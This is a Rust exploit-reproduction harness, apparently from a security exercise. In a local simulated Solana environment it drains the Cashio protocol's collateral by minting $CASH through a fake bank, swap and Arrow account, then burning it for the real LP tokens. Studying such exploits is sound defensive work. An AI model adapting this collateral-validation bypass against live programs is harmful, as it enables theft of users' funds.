use anchor_lang::{prelude::*, system_program, InstructionData};
use arrow_sunny::{Arrow, ArrowMiner};
use bankman::CASH_DECIMALS;
use solana_program::{
    instruction::Instruction, native_token::sol_to_lamports, program_pack::Pack, pubkey::Pubkey,
    system_instruction,
};
use solana_sdk::{signature::Keypair, signer::Signer};
use stable_swap_client::{fees::Fees, state::SwapInfo};
use sunburn::{client::LocalClientSync, AccountConfig, EnvironmentGenesis, LogConfig};

type Result<T, E> = std::result::Result<T, E>;

mod sanitizer;
use crate::sanitizer::*;

struct FakeArrow {
    #[allow(dead_code)]
    dummy: Pubkey,
    arrow_addr: Keypair,
    arrow_data: Vec<u8>,
}

/// We provide an API to create a fake Arrow because faking it is technically
/// not difficult (only two trivial fields are checked in the struct) but can be
/// time consuming.
///
/// Feel free to create your own fake arrow account for an extra credit :)
fn create_fake_arrow(token_mint: Pubkey) -> FakeArrow {
    let dummy = Keypair::new();
    let arrow_addr = Keypair::new();

    let vendor_miner = ArrowMiner {
        mint: token_mint,
        rewarder: dummy.pubkey(),
        quarry: dummy.pubkey(),
        miner: dummy.pubkey(),
        miner_vault: dummy.pubkey(),
        rewards_mint: dummy.pubkey(),
        mint_wrapper: dummy.pubkey(),
        claim_fee_token_account: dummy.pubkey(),
        vault_staked_token_account: dummy.pubkey(),
        vault_rewards_token_account: dummy.pubkey(),
        sunny_pool_rewards_fee_account: dummy.pubkey(),
    };

    let internal_miner = ArrowMiner {
        mint: dummy.pubkey(),
        rewarder: dummy.pubkey(),
        quarry: dummy.pubkey(),
        miner: dummy.pubkey(),
        miner_vault: dummy.pubkey(),
        rewards_mint: dummy.pubkey(),
        mint_wrapper: dummy.pubkey(),
        claim_fee_token_account: dummy.pubkey(),
        vault_staked_token_account: dummy.pubkey(),
        vault_rewards_token_account: dummy.pubkey(),
        sunny_pool_rewards_fee_account: dummy.pubkey(),
    };

    let arrow = Arrow {
        mint: token_mint,
        bump: 0,
        beneficiary: dummy.pubkey(),
        pool: dummy.pubkey(),
        vault: dummy.pubkey(),
        vendor_miner,
        internal_miner,
    };

    let mut arrow_data = Vec::new();
    arrow.try_serialize(&mut arrow_data).unwrap();

    FakeArrow {
        dummy: dummy.pubkey(),
        arrow_addr,
        arrow_data,
    }
}

const SOLVE_AMOUNT: u64 = 10_000_000_000;

fn main() -> Result<(), anyhow::Error> {
    // prepare mock environment
    let bankman_data = std::fs::read("cashio/target/deploy/bankman.so")?;
    let brrr_data = std::fs::read("cashio/target/deploy/brrr.so")?;
    let crate_token_data = std::fs::read("dep-programs/crate-token-0.6.0.so")?;
    let arrow_sunny_data = std::fs::read("dep-programs/arrow_sunny-0.3.1.so")?;
    let stable_swap_data = std::fs::read("dep-programs/stable-swap.so")?;

    let stable_token_authority = Keypair::new();
    let stable_a_mint = Keypair::new();
    let stable_b_mint = Keypair::new();

    let saber_authority = Keypair::new();
    let saber_lp_mint = Keypair::new();
    let saber_swap_info = Keypair::new();

    let cashio_authority = Keypair::new();
    let cashio_mint = Keypair::new();

    let fake_arrow = create_fake_arrow(saber_lp_mint.pubkey());

    let hacker = Keypair::new();
    let innocent = Keypair::new();

    // Fake Arrow pool is provided
    let hacker_saber_lp_mint = Keypair::new();
    let hacker_fake_arrow = create_fake_arrow(hacker_saber_lp_mint.pubkey());

    let mut env = EnvironmentGenesis::new()
        .setup_logging(LogConfig::verbose())
        .add_program(bankman::ID, bankman_data)
        .add_program(brrr::ID, brrr_data)
        .add_program(crate_token::ID, crate_token_data)
        .add_program(arrow_sunny::ID, arrow_sunny_data)
        .add_program(stable_swap_client::ID, stable_swap_data)
        .add_account(
            fake_arrow.arrow_addr.pubkey(),
            AccountConfig {
                data: fake_arrow.arrow_data,
                owner: arrow_sunny::ID,
                ..Default::default()
            },
        )
        .add_account(
            hacker_fake_arrow.arrow_addr.pubkey(),
            AccountConfig {
                data: hacker_fake_arrow.arrow_data,
                owner: arrow_sunny::ID,
                ..Default::default()
            },
        )
        .add_account(
            cashio_authority.pubkey(),
            AccountConfig {
                lamports: Some(sol_to_lamports(1_000_000.0)),
                ..Default::default()
            },
        )
        .add_account(
            hacker.pubkey(),
            AccountConfig {
                lamports: Some(sol_to_lamports(1.0)),
                ..Default::default()
            },
        )
        .add_account(
            innocent.pubkey(),
            AccountConfig {
                lamports: Some(sol_to_lamports(100.0)),
                ..Default::default()
            },
        )
        .build_local_sync();

    println!("Step 1: Prepare Saber Swap and LP token");

    env.create_token_mint(
        &stable_a_mint,
        stable_token_authority.pubkey(),
        None,
        CASH_DECIMALS,
    )?;
    env.create_token_mint(
        &stable_b_mint,
        stable_token_authority.pubkey(),
        None,
        CASH_DECIMALS,
    )?;

    let (swap_authority, swap_authority_nonce) = Pubkey::find_program_address(
        &[&saber_swap_info.pubkey().to_bytes()[..32]],
        &stable_swap_client::ID,
    );

    env.create_token_mint(&saber_lp_mint, swap_authority, None, CASH_DECIMALS)?;

    let swap_stable_a_wallet =
        env.create_associated_token_account(swap_authority, stable_a_mint.pubkey())?;
    let swap_stable_b_wallet =
        env.create_associated_token_account(swap_authority, stable_b_mint.pubkey())?;

    env.mint_tokens(
        stable_a_mint.pubkey(),
        &stable_token_authority,
        swap_stable_a_wallet,
        100_000_000_000_000,
    )?;
    env.mint_tokens(
        stable_b_mint.pubkey(),
        &stable_token_authority,
        swap_stable_b_wallet,
        100_000_000_000_000,
    )?;

    // The innocent receives initial LP tokens.
    // In more realistic situation, the innocent would deposit their stable token to receive it.
    let innocent_saber_wallet =
        env.create_associated_token_account(innocent.pubkey(), saber_lp_mint.pubkey())?;

    let swap_info_exemption_amount = env.rent_exemption_amount(SwapInfo::LEN);
    env.run_instructions(
        &[
            system_instruction::create_account(
                &env.payer().pubkey(),
                &saber_swap_info.pubkey(),
                swap_info_exemption_amount,
                SwapInfo::LEN as u64,
                &stable_swap_client::ID,
            ),
            stable_swap_client::instruction::initialize(
                &spl_token::ID,
                &saber_swap_info.pubkey(),
                &swap_authority,
                &saber_authority.pubkey(),
                &swap_stable_a_wallet,
                &swap_stable_b_wallet,
                &stable_a_mint.pubkey(),
                &swap_stable_a_wallet,
                &stable_b_mint.pubkey(),
                &swap_stable_b_wallet,
                &saber_lp_mint.pubkey(),
                &innocent_saber_wallet,
                swap_authority_nonce,
                100,
                Fees {
                    admin_trade_fee_numerator: 0,
                    admin_trade_fee_denominator: 1,
                    admin_withdraw_fee_numerator: 0,
                    admin_withdraw_fee_denominator: 1,
                    trade_fee_numerator: 0,
                    trade_fee_denominator: 1,
                    withdraw_fee_numerator: 0,
                    withdraw_fee_denominator: 1,
                },
            )?,
        ],
        &[&saber_swap_info],
    )?;

    println!("Step 2: Prepare Cash token");
    let (cashio_crate_token, cashio_crate_token_bump) = Pubkey::find_program_address(
        &[b"CrateToken".as_ref(), &cashio_mint.pubkey().to_bytes()],
        &crate_token::ID,
    );

    let (bank, bank_bump) = Pubkey::find_program_address(
        &[b"Bank".as_ref(), &cashio_crate_token.to_bytes()],
        &bankman::ID,
    );

    env.create_token_mint(
        &cashio_mint,
        cashio_crate_token,
        Some(cashio_crate_token),
        bankman::CASH_DECIMALS,
    )?;

    println!("Step 3: Initialize a new bank");
    env.run_instruction(
        Instruction {
            program_id: bankman::ID,
            accounts: bankman::accounts::NewBank {
                bank,
                crate_mint: cashio_mint.pubkey(),
                crate_token: cashio_crate_token,
                brrr_issue_authority: brrr::ISSUE_AUTHORITY_ADDRESS,
                burn_withdraw_authority: brrr::WITHDRAW_AUTHORITY_ADDRESS,
                payer: cashio_authority.pubkey(),
                admin: cashio_authority.pubkey(),
                system_program: system_program::ID,
                crate_token_program: crate_token::ID,
            }
            .to_account_metas(None),
            data: bankman::instruction::NewBank {
                _bank_bump: bank_bump,
                crate_bump: cashio_crate_token_bump,
            }
            .data(),
        },
        &[&cashio_authority],
    )?;

    println!("Step 4: Add the saber LP token as a collateral");
    let (cashio_collateral, cashio_collateral_bump) = Pubkey::find_program_address(
        &[
            b"Collateral".as_ref(),
            &bank.to_bytes(),
            &saber_lp_mint.pubkey().to_bytes(),
        ],
        &bankman::ID,
    );

    env.run_instruction(
        Instruction {
            program_id: bankman::ID,
            accounts: bankman::accounts::AuthorizeCollateral {
                bank,
                collateral: cashio_collateral,
                mint: saber_lp_mint.pubkey(),
                curator: cashio_authority.pubkey(),
                payer: cashio_authority.pubkey(),
                system_program: system_program::ID,
            }
            .to_account_metas(None),
            data: bankman::instruction::AuthorizeCollateral {
                _bump: cashio_collateral_bump,
            }
            .data(),
        },
        &[&cashio_authority],
    )?;

    println!("Step 5: Set Collateral hard cap");
    env.run_instruction(
        Instruction {
            program_id: bankman::ID,
            accounts: bankman::accounts::SetCollateralHardCap {
                bank,
                collateral: cashio_collateral,
                curator: cashio_authority.pubkey(),
            }
            .to_account_metas(None),
            data: bankman::instruction::SetCollateralHardCap { hard_cap: u64::MAX }.data(),
        },
        &[&cashio_authority],
    )?;

    println!("Step 6: The innocent prints $CASH");
    let cashio_collateral_wallet =
        env.create_associated_token_account(cashio_crate_token, saber_lp_mint.pubkey())?;

    let innocent_cash_wallet =
        env.create_associated_token_account(innocent.pubkey(), cashio_mint.pubkey())?;

    env.run_instruction(
        Instruction {
            program_id: brrr::ID,
            accounts: brrr_shim::accounts::PrintCash {
                common: brrr_shim::accounts::BrrrCommon {
                    bank,
                    collateral: cashio_collateral,
                    crate_token: cashio_crate_token,
                    crate_mint: cashio_mint.pubkey(),
                    crate_collateral_tokens: cashio_collateral_wallet,
                    saber_swap: brrr_shim::accounts::SaberSwapAccounts {
                        arrow: fake_arrow.arrow_addr.pubkey(),
                        saber_swap: saber_swap_info.pubkey(),
                        pool_mint: saber_lp_mint.pubkey(),
                        reserve_a: swap_stable_a_wallet,
                        reserve_b: swap_stable_b_wallet,
                    },
                    token_program: spl_token::ID,
                    crate_token_program: crate_token::ID,
                },
                depositor: innocent.pubkey(),
                depositor_source: innocent_saber_wallet,
                mint_destination: innocent_cash_wallet,
                issue_authority: brrr::ISSUE_AUTHORITY_ADDRESS,
            }
            .to_account_metas(None),
            data: brrr::instruction::PrintCash {
                deposit_amount: 100_000_000_000,
            }
            .data(),
        },
        &[&innocent],
    )?;

    let sanitizer = Sanitizer {
        bank: BankInfo {
            cashio_collateral_wallet,
            cashio_mint: cashio_mint.pubkey(),
            saber_swap_info: saber_swap_info.pubkey(),
        },
    };

    println!("Step 7: prepare hackers' wallets");
    let hacker_saber_wallet =
        env.create_associated_token_account(hacker.pubkey(), saber_lp_mint.pubkey())?;

    let hacker_cash_wallet =
        env.create_associated_token_account(hacker.pubkey(), cashio_mint.pubkey())?;

    println!("Successfully initialized!");

    println!("==============================");
    println!("[Before Hacking]");
    println!(
        "Innocent's $CASH: {}",
        env.token_balance(innocent_cash_wallet)?
    );
    println!(
        "Saber LP in bank: {}",
        env.token_balance(cashio_collateral_wallet)?
    );

    println!("hacker's $CASH: {}", env.token_balance(hacker_cash_wallet)?);
    println!(
        "hacker's Saber LP: {}",
        env.token_balance(hacker_saber_wallet)?
    );
    println!("==============================");

    // execute PoC
    let hacker_info = HackerInfo {
        hacker,

        hacker_saber_lp_mint,
        hacker_fake_arrow_addr: hacker_fake_arrow.arrow_addr.pubkey(),

        hacker_saber_wallet,
        hacker_cash_wallet,

        stable_token_authority: stable_token_authority.pubkey(),
        stable_a_mint: stable_a_mint.pubkey(),
        stable_b_mint: stable_b_mint.pubkey(),

        saber_authority: saber_authority.pubkey(),
        saber_lp_mint: saber_lp_mint.pubkey(),
        saber_swap_info: saber_swap_info.pubkey(),
        saber_swap_stable_a_wallet: swap_stable_a_wallet,
        saber_swap_stable_b_wallet: swap_stable_b_wallet,

        cashio_authority: cashio_authority.pubkey(),
        cashio_mint: cashio_mint.pubkey(),

        cashio_crate_token,
        cashio_bank: bank,

        cashio_collateral,
        cashio_collateral_wallet,

        innocent_cash_wallet,

        fake_arrow_addr: fake_arrow.arrow_addr.pubkey(),
    };

    execute_poc(&mut env, &hacker_info)?;

    // validate PoC
    println!("==============================");
    println!("[After Hacking]");
    println!(
        "Innocent's $CASH: {}",
        env.token_balance(innocent_cash_wallet)?
    );
    println!(
        "Saber LP in bank: {}",
        env.token_balance(cashio_collateral_wallet)?
    );

    let hacker_cash_tokens = env.token_balance(hacker_cash_wallet)?;
    let hacker_lp_tokens = env.token_balance(hacker_saber_wallet)?;

    print!(
        "Hacker's $CASH: {} >= {}? - ",
        hacker_cash_tokens, SOLVE_AMOUNT
    );
    if hacker_cash_tokens >= SOLVE_AMOUNT {
        println!("PASS");
    } else {
        println!("FAIL");
    }

    print!(
        "Hacker's Saber LP: {} >= {}? - ",
        hacker_lp_tokens, SOLVE_AMOUNT,
    );
    if hacker_lp_tokens >= SOLVE_AMOUNT {
        println!("PASS");
    } else {
        println!("FAIL");
    }
    println!("==============================");

    println!("[Testing Predicate]");
    match sanitizer.check(&mut env) {
        Ok(true) => panic!("Predicate fails"),
        Ok(false) => println!("Predicate works: not enough collateral"),
        Err(err) => panic!("Predicate error: {:?}", err),
    }

    Ok(())
}

#[allow(dead_code)]
struct HackerInfo {
    hacker: Keypair,

    // We provide an already-faked Arrow account
    hacker_saber_lp_mint: Keypair,
    hacker_fake_arrow_addr: Pubkey,

    hacker_cash_wallet: Pubkey,
    hacker_saber_wallet: Pubkey,

    stable_token_authority: Pubkey,
    stable_a_mint: Pubkey,
    stable_b_mint: Pubkey,

    saber_authority: Pubkey,
    saber_lp_mint: Pubkey,
    saber_swap_info: Pubkey,
    saber_swap_stable_a_wallet: Pubkey,
    saber_swap_stable_b_wallet: Pubkey,

    cashio_authority: Pubkey,
    cashio_mint: Pubkey,

    cashio_crate_token: Pubkey,
    cashio_bank: Pubkey,

    cashio_collateral: Pubkey,
    cashio_collateral_wallet: Pubkey,

    innocent_cash_wallet: Pubkey,

    fake_arrow_addr: Pubkey,
}

/// Write a PoC code so that hacker's cash wallet and saber LP wallet
/// both hold at least SOLVE_AMOUNT of tokens.
fn execute_poc(
    env: &mut sunburn::Environment<LocalClientSync>,
    hacker_info: &HackerInfo,
) -> Result<(), anyhow::Error> {
    // Write your exploit here
    let hacker = &hacker_info.hacker;

    let fake_stable_a_mint = Keypair::new();
    let fake_stable_b_mint = Keypair::new();

    let fake_saber_lp_mint = &hacker_info.hacker_saber_lp_mint;
    let fake_saber_swap_info = Keypair::new();

    let fake_arrow_addr = &hacker_info.hacker_fake_arrow_addr;

    println!("Hacking starts: aiming at {} $CASH", SOLVE_AMOUNT);

    println!("Hacking step 1: create a fake bank account");
    let fake_cash_mint = Keypair::new();
    let (cashio_crate_token, cashio_crate_token_bump) = Pubkey::find_program_address(
        &[
            b"CrateToken".as_ref(),
            fake_cash_mint.pubkey().to_bytes().as_ref(),
        ],
        &crate_token::ID,
    );
    let (fake_bank, fake_bank_bump) = Pubkey::find_program_address(
        &[b"Bank".as_ref(), cashio_crate_token.key().as_ref()],
        &bankman::ID,
    );

    env.create_token_mint(
        &fake_cash_mint,
        cashio_crate_token,
        Some(cashio_crate_token),
        bankman::CASH_DECIMALS,
    )?;

    env.run_instruction(
        Instruction {
            program_id: bankman::ID,
            accounts: bankman::accounts::NewBank {
                bank: fake_bank,
                crate_mint: fake_cash_mint.pubkey(),
                crate_token: cashio_crate_token,
                brrr_issue_authority: hacker.pubkey(),
                burn_withdraw_authority: hacker.pubkey(),
                payer: hacker.pubkey(),
                admin: hacker.pubkey(),
                system_program: system_program::ID,
                crate_token_program: crate_token::ID,
            }
            .to_account_metas(None),
            data: bankman::instruction::NewBank {
                _bank_bump: fake_bank_bump,
                crate_bump: cashio_crate_token_bump,
            }
            .data(),
        },
        &[&hacker],
    )?;

    println!("Hacking step 2: create a fake saber swap");
    env.create_token_mint(&fake_stable_a_mint, hacker.pubkey(), None, CASH_DECIMALS)?;
    env.create_token_mint(&fake_stable_b_mint, hacker.pubkey(), None, CASH_DECIMALS)?;

    let (fake_swap_authority, fake_swap_authority_nonce) = Pubkey::find_program_address(
        &[&fake_saber_swap_info.pubkey().to_bytes()[..32]],
        &stable_swap_client::ID,
    );

    env.create_token_mint(
        &fake_saber_lp_mint,
        fake_swap_authority,
        None,
        CASH_DECIMALS,
    )?;

    let fake_swap_stable_a_wallet =
        env.create_associated_token_account(fake_swap_authority, fake_stable_a_mint.pubkey())?;
    let fake_swap_stable_b_wallet =
        env.create_associated_token_account(fake_swap_authority, fake_stable_b_mint.pubkey())?;

    env.mint_tokens(
        fake_stable_a_mint.pubkey(),
        &hacker,
        fake_swap_stable_a_wallet,
        100_000_000_000_000,
    )?;
    env.mint_tokens(
        fake_stable_b_mint.pubkey(),
        &hacker,
        fake_swap_stable_b_wallet,
        100_000_000_000_000,
    )?;

    let hacker_saber_wallet =
        env.create_associated_token_account(hacker.pubkey(), fake_saber_lp_mint.pubkey())?;

    let swap_info_exemption_amount = env.rent_exemption_amount(SwapInfo::LEN);
    env.run_instructions(
        &[
            system_instruction::create_account(
                &env.payer().pubkey(),
                &fake_saber_swap_info.pubkey(),
                swap_info_exemption_amount,
                SwapInfo::LEN as u64,
                &stable_swap_client::ID,
            ),
            stable_swap_client::instruction::initialize(
                &spl_token::ID,
                &fake_saber_swap_info.pubkey(),
                &fake_swap_authority,
                &hacker.pubkey(),
                &fake_swap_stable_a_wallet,
                &fake_swap_stable_b_wallet,
                &fake_stable_a_mint.pubkey(),
                &fake_swap_stable_a_wallet,
                &fake_stable_b_mint.pubkey(),
                &fake_swap_stable_b_wallet,
                &fake_saber_lp_mint.pubkey(),
                &hacker_saber_wallet,
                fake_swap_authority_nonce,
                100,
                Fees {
                    admin_trade_fee_numerator: 0,
                    admin_trade_fee_denominator: 1,
                    admin_withdraw_fee_numerator: 0,
                    admin_withdraw_fee_denominator: 1,
                    trade_fee_numerator: 0,
                    trade_fee_denominator: 1,
                    withdraw_fee_numerator: 0,
                    withdraw_fee_denominator: 1,
                },
            )?,
        ],
        &[&fake_saber_swap_info],
    )?;

    println!("Hacking step 3: create a fake collateral belonging to the fake bank");
    // to make it simple, we use the fake $CASH as collateral
    let (fake_collateral, fake_collateral_bump) = Pubkey::find_program_address(
        &[
            b"Collateral".as_ref(),
            fake_bank.key().as_ref(),
            fake_saber_lp_mint.pubkey().as_ref(),
        ],
        &bankman::ID,
    );
    env.run_instructions(
        &[
            Instruction {
                program_id: bankman::ID,
                accounts: bankman::accounts::AuthorizeCollateral {
                    bank: fake_bank,
                    collateral: fake_collateral,
                    mint: fake_saber_lp_mint.pubkey(),
                    curator: hacker.pubkey(),
                    payer: hacker.pubkey(),
                    system_program: system_program::ID,
                }
                .to_account_metas(None),
                data: bankman::instruction::AuthorizeCollateral {
                    _bump: fake_collateral_bump,
                }
                .data(),
            },
            Instruction {
                program_id: bankman::ID,
                accounts: bankman::accounts::SetCollateralHardCap {
                    bank: fake_bank,
                    collateral: fake_collateral,
                    curator: hacker.pubkey(),
                }
                .to_account_metas(None),
                data: bankman::instruction::SetCollateralHardCap { hard_cap: u64::MAX }.data(),
            },
        ],
        &[&hacker],
    )?;

    println!("Hacking step 4: print $CASH by depositing fake LP tokens");
    let fake_collateral_wallet = env.create_associated_token_account(
        hacker_info.cashio_crate_token,
        fake_saber_lp_mint.pubkey(),
    )?;

    env.run_instruction(
        Instruction {
            program_id: brrr::ID,
            accounts: brrr_shim::accounts::PrintCash {
                common: brrr_shim::accounts::BrrrCommon {
                    bank: fake_bank,
                    collateral: fake_collateral,
                    crate_token: hacker_info.cashio_crate_token,
                    crate_mint: hacker_info.cashio_mint,
                    crate_collateral_tokens: fake_collateral_wallet,
                    saber_swap: brrr_shim::accounts::SaberSwapAccounts {
                        arrow: *fake_arrow_addr,
                        saber_swap: fake_saber_swap_info.pubkey(),
                        pool_mint: fake_saber_lp_mint.pubkey(),
                        reserve_a: fake_swap_stable_a_wallet,
                        reserve_b: fake_swap_stable_b_wallet,
                    },
                    token_program: spl_token::ID,
                    crate_token_program: crate_token::ID,
                },
                depositor: hacker.pubkey(),
                depositor_source: hacker_saber_wallet,
                mint_destination: hacker_info.hacker_cash_wallet,
                issue_authority: brrr::ISSUE_AUTHORITY_ADDRESS,
            }
            .to_account_metas(None),
            data: brrr::instruction::PrintCash {
                deposit_amount: SOLVE_AMOUNT * 5,
            }
            .data(),
        },
        &[&hacker],
    )?;

    println!("Hacking step 5: burn $CASH to steal LP tokens");
    let author_fee_destination =
        env.create_associated_token_account(hacker_info.cashio_bank, hacker_info.saber_lp_mint)?;
    let protocol_fee_destination = env
        .create_associated_token_account(crate_token::FEE_TO_ADDRESS, hacker_info.saber_lp_mint)?;
    env.run_instruction(
        Instruction {
            program_id: brrr::ID,
            accounts: brrr_shim::accounts::BurnCash {
                common: brrr_shim::accounts::BrrrCommon {
                    bank: hacker_info.cashio_bank,
                    collateral: hacker_info.cashio_collateral,
                    crate_token: hacker_info.cashio_crate_token,
                    crate_mint: hacker_info.cashio_mint,
                    crate_collateral_tokens: hacker_info.cashio_collateral_wallet,
                    saber_swap: brrr_shim::accounts::SaberSwapAccounts {
                        arrow: hacker_info.fake_arrow_addr,
                        saber_swap: hacker_info.saber_swap_info,
                        pool_mint: hacker_info.saber_lp_mint,
                        reserve_a: hacker_info.saber_swap_stable_a_wallet,
                        reserve_b: hacker_info.saber_swap_stable_b_wallet,
                    },
                    token_program: spl_token::ID,
                    crate_token_program: crate_token::ID,
                },
                burner: hacker.pubkey(),
                burned_cash_source: hacker_info.hacker_cash_wallet,
                withdraw_destination: hacker_info.hacker_saber_wallet,
                author_fee_destination,
                protocol_fee_destination,
                withdraw_authority: brrr::WITHDRAW_AUTHORITY_ADDRESS,
            }
            .to_account_metas(None),
            data: brrr::instruction::BurnCash {
                burn_amount: SOLVE_AMOUNT * 2,
            }
            .data(),
        },
        &[&hacker],
    )?;

    Ok(())
}
